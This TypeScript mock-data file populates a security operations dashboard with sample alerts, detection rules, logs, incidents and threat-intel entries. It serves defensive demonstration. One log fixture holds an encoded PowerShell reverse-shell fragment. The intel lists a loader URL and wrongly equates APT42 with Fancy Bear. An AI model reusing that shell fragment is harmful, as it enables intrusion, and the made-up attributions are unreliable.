import type { Alert, Rule, Log, Incident, ThreatIntel, DashboardStats } from './types';

export const dashboardStats: DashboardStats = {
  totalAlerts: 102,
  criticalAlerts: 12,
  openIncidents: 8,
  rulesActive: 56,
};

export const alerts: Alert[] = [
  {
    id: 'ALERT-001',
    timestamp: '2024-07-31T10:30:00Z',
    source: '10.1.1.25',
    threatType: 'Potential Credential Dumping',
    severity: 'Critical',
    iocs: ['mimikatz.exe'],
    affectedSystems: ['DC01'],
    description: 'LSASS memory access detected from an unusual process.',
  },
  {
    id: 'ALERT-002',
    timestamp: '2024-07-31T10:25:00Z',
    source: '192.168.5.10',
    threatType: 'Lateral Movement',
    severity: 'High',
    iocs: ['PsExec.exe'],
    affectedSystems: ['SRV-FIN-01', 'SRV-FIN-02'],
    description: 'PsExec used to move between finance servers.',
  },
  {
    id: 'ALERT-003',
    timestamp: '2024-07-31T09:15:00Z',
    source: 'workstation-112',
    threatType: 'Suspicious PowerShell',
    severity: 'Medium',
    iocs: ['powershell.exe -enc'],
    affectedSystems: ['workstation-112'],
    description: 'Obfuscated PowerShell command executed.',
  },
  {
    id: 'ALERT-004',
    timestamp: '2024-07-31T08:45:00Z',
    source: 'proxy-01',
    threatType: 'Data Exfiltration',
    severity: 'High',
    iocs: ['pastebin.com'],
    affectedSystems: ['workstation-88'],
    description: 'Large data upload to a known paste site from an internal system.',
  },
  {
    id: 'ALERT-005',
    timestamp: '2024-07-31T08:30:00Z',
    source: 'firewall-ext',
    threatType: 'Initial Intrusion',
    severity: 'Medium',
    iocs: ['93.184.216.34'],
    affectedSystems: ['web-server-03'],
    description: 'Multiple failed login attempts from a malicious IP followed by a successful one.',
  },
  {
    id: 'ALERT-006',
    timestamp: '2024-07-31T07:00:00Z',
    source: 'antivirus-console',
    threatType: 'Malware Detected',
    severity: 'Low',
    iocs: ['adware.gen'],
    affectedSystems: ['workstation-201'],
    description: 'Generic adware detected and quarantined.',
  },
];

export const rules: Rule[] = [
  {
    id: 'RULE-001',
    name: 'Detect Mimikatz Usage',
    description: 'Identifies processes accessing LSASS memory, a common technique for credential dumping.',
    category: 'Credential Dumping',
    query: 'process.name:lsass.exe AND source.ip:"10.0.0.0/8"',
    mitreAttackId: 'T1003.001',
  },
  {
    id: 'RULE-002',
    name: 'PsExec Execution',
    description: 'Monitors for the use of PsExec, often used for lateral movement.',
    category: 'Lateral Movement',
    query: 'process.name:psexec.exe OR process.name:psexesvc.exe',
    mitreAttackId: 'T1570',
  },
  {
    id: 'RULE-003',
    name: 'Encoded PowerShell Command',
    description: 'Detects PowerShell commands using the -EncodedCommand flag, a common obfuscation technique.',
    category: 'PowerShell',
    query: 'process.command_line: "*powershell* -enc *"',
    mitreAttackId: 'T1027',
  },
  {
    id: 'RULE-004',
    name: 'Large DNS Tunneling',
    description: 'Looks for abnormally large DNS queries, which can indicate data exfiltration.',
    category: 'Data Exfiltration',
    query: 'network.protocol:dns AND dns.query.length > 255',
    mitreAttackId: 'T1071.004',
  },
];

export const logs: Log[] = [
  {
    id: 'LOG-001',
    timestamp: '2024-07-31T11:00:01Z',
    source: 'Sysmon',
    host: 'DC01',
    message: 'ProcessId 1337 accessed lsass.exe with call trace C:\\Windows\\system32\\ntdll.dll+9d574|C:\\Windows\\system32\\KERNELBASE.dll+2f38c|C:\\temp\\dbg.exe+14a8',
  },
  {
    id: 'LOG-002',
    timestamp: '2024-07-31T11:00:02Z',
    source: 'Windows Event Log',
    host: 'SRV-FIN-01',
    message: 'Event 4624, Logon Type 3, Account Name: ADMIN-USER, Source IP: 192.168.5.10',
  },
  {
    id: 'LOG-003',
    timestamp: '2024-07-31T11:00:03Z',
    source: 'Network Log',
    host: 'proxy-01',
    message: '192.168.1.55:58123 -> 8.8.8.8:53, UDP, DNS query for evil-c2.com',
  },
  {
    id: 'LOG-004',
    timestamp: '2024-07-31T11:00:04Z',
    source: 'Firewall',
    host: 'FW-EDGE',
    message: 'DENY: 93.184.216.34 -> 10.0.0.50:22, TCP, Rule: "Block All Inbound SSH"',
  },
  {
    id: 'LOG-005',
    timestamp: '2024-07-31T11:00:05Z',
    source: 'Sysmon',
    host: 'workstation-112',
    message: 'ProcessCreate: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUA',
  },
];

export const incidents: Incident[] = [
  {
    id: 'INC-001',
    alertId: 'ALERT-001',
    status: 'In Progress',
    assignedTo: 'Jane Doe',
    severity: 'Critical',
    createdAt: '2024-07-31T10:31:00Z',
    description: 'Potential domain admin compromise. Investigating DC01.',
  },
  {
    id: 'INC-002',
    alertId: 'ALERT-002',
    status: 'In Progress',
    assignedTo: 'John Smith',
    severity: 'High',
    createdAt: '2024-07-31T10:26:00Z',
    description: 'Confirmed lateral movement in finance network. Isolating servers.',
  },
  {
    id: 'INC-003',
    alertId: 'ALERT-003',
    status: 'New',
    assignedTo: 'Unassigned',
    severity: 'Medium',
    createdAt: '2024-07-31T09:16:00Z',
    description: 'Suspicious PowerShell script on a marketing workstation.',
  },
  {
    id: 'INC-004',
    alertId: 'ALERT-004',
    status: 'Resolved',
    assignedTo: 'Jane Doe',
    severity: 'High',
    createdAt: '2024-07-31T08:46:00Z',
    description: 'Data leak from workstation-88. Machine has been reimaged.',
  },
];

export const threatIntels: ThreatIntel[] = [
  {
    id: 'INTEL-001',
    title: 'New Campaign by APT42 (Fancy Bear)',
    publishedDate: '2024-07-30',
    source: 'Mandiant',
    content: 'APT42 has been observed targeting government entities in Eastern Europe using a new variant of the "Graphite" malware. The initial attack vector appears to be spear-phishing emails with malicious macros.',
    iocs: [
      { type: 'MD5', value: 'e4d909c290d0fb1ca068ffaddf22cbd0' },
      { type: 'Domain', value: 'secure-updates-microsoft.com' },
    ],
    aptGroups: ['APT42', 'Fancy Bear'],
  },
  {
    id: 'INTEL-002',
    title: 'Lazarus Group Exploiting Log4j Vulnerability',
    publishedDate: '2024-07-29',
    source: 'CrowdStrike',
    content: 'The Lazarus Group is actively exploiting CVE-2021-44228 (Log4Shell) against financial institutions. Payloads include cryptocurrency miners and ransomware.',
    iocs: [
      { type: 'IP', value: '185.193.127.12' },
      { type: 'URL', value: 'http://45.83.65.57/ldr.sh' },
    ],
    aptGroups: ['Lazarus Group'],
  },
];
